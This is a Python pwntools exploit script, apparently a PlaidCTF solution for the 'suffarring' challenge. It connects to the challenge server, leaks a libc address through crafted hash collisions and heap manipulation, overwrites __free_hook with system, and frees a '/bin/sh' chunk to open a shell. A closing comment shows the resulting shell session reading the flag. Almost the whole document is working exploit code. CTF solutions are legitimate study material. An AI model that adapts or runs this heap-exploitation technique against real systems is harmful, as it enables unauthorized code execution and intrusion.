from pwn import *

#r = process("./suffarring")
r = remote("suffarring.pwni.ng", 7361)

def add(len_, dt):
    r.sendline("A")
    print r.recvuntil("> ")
    r.sendline(str(len_))
    print r.recvuntil("> ")
    r.sendline(dt)
    print r.recvuntil("> ")

def recent(idx, needleLen, needleDt):
    r.sendline("R")
    print r.recvuntil("> ")
    r.sendline(str(idx))
    print r.recvuntil("> ")
    r.sendline(str(needleLen))
    print r.recvuntil("> ")
    r.sendline(needleDt)
    print r.recvuntil("> ")

def delete(idx):
    r.sendline("D")
    print r.recvuntil("> ")
    r.sendline(str(idx))
    print r.recvuntil("> ")

def byteto257(fuck):
    p = 0
    for i in fuck:
        p *= 257
        p += ord(i)
        p = p % 2**64
    return p

def tobyte(fuck):
    c = ""
    for i in range(8):
        tmp = fuck % 257
        fuck = (fuck - tmp)/257
        c += chr(tmp)
    return c[::-1]

def gethash(payload):
    val = byteto257(payload) * pow(257, 8, 2**64) % 2**64
    return tobyte(2**64 - val)

print r.recvuntil("> ")

for i in range(4):
    add(100, "A"*99)

add(10, "A"*9)

for i in range(4):
    delete(i)

magic = ""
magic += gethash(magic)

dat = magic

magic += "\x00"*40+"ABCDABCD"

add(len(magic), magic)

for i in range(10):
    add(40, "B"*39)

add(4, "CCC")
for i in range(10):
    delete(i+1)

r.sendline("R")
r.sendline("0")
r.sendline(str(len(dat)))
r.sendline(dat)

libc = r.recvuntil("\x7f")[-6:] + "\x00\x00"
libc = u64(libc)
libc_base = libc - 0x3ec080

print "libc: " + hex(libc_base)

delete(00)
delete(11)
delete(12)

add(576, "\x00"*575)
delete(0)

free_hook = libc_base + 0x3ed8e8

###
magic = "\xcc"*8
magic += p64(0xdeadbeef)*13 + p64(free_hook)
magic += gethash(magic)

dat = magic

magic += "\x00"*400

add(len(magic), magic)

add(1, "t")
add(1, "t")
add(1, "t")

delete(2)
delete(1)

recent(0, len(dat), dat)

add(18, "\x00"*18)
add(18, "\x00"*18)
add(18, "\x00"*18)

r.sendline("A")
r.sendline("18")
r.sendline(p64(libc_base+0x4f440)+"\x00"*10)

add(18, "/bin/sh\x00" + "\x00"*10)

r.sendline("D\n6\n")

r.interactive()

'''
$ cd /home/suffarring
$ ls
flag.txt
suffarring
$ cat flag.txt
PCTF{You-hav3-suff3r3d-so-h3r3's-your-sh1ny-r1ng}
'''
